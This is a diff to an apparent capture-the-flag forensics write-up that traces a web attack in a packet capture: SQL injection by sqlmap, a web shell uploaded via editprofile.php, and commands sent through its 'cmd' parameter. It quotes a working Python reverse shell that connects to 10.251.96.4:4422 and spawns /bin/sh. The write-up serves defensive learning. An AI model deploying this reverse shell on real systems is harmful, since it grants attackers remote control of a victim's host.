@@ -25,4 +25,41 @@ A quick research told me that this is a typical **UNION SELECT** SQL injection p
 
 After analyzing the User agent I found another tool: `sqlmap 1.4.7`.
 
-Next question is the name of the PHP file through wich the attacker uploaded a web shell. 
+Next question is the name of the PHP file through wich the attacker uploaded a web shell. To approach this, I looked in the `HTTP POST` requests using the filter `http.request.method == "POST"`. The attacker might have uploaded the shell through a `POST` request, which is common for file uploads. I search through the POST requests and in the **Referer** header of the `16102` package I found `http://10.251.96.5/editprofile.php`, so I concluded that the attacker interacred with the `editprofile.php` page on the server.
+
+To find out the name of the web shell that the attacker uploaded, I followed the TCP stream of the packet `16102` - which translates to`tcp.stream eq 1270`- this showed me the packet information, plaintext of `fileToUpload`, which is `dbfunctions.php`.
+
+Next, to find the parameter used in the web shell for executing commands, I looked for interactions with `dbfunctions.php`:
+
+```
+http.request.uri contains "dbfunctions.php"
+```
+
+This filter checks for `GET` or `POST`requests that target the `dbfunctions.php` file. These requests often contain a parameter that the attacker is using to pass commands for execution.
+In the results, I found a `cmd` parameter which contains **operating system commands** like `id` and `whoami`.
+
+Ordering the packets by Number, I saw that the first one in being executed is `id.`
+
+The next command being executed is clearly a Python script:
+
+![Python script](../assets/python-script.png)
+
+After cleaning it and indenting it this is the result:
+
+```py
+import socket
+import subprocess
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect(("10.251.96.4", 4422))
+
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+
+subprocess.call(["/bin/sh", "-i"])
+```
+
+This is a `reverse` shell to `10.251.96.4` to utilize `/bin/sh` through the port `4422`.
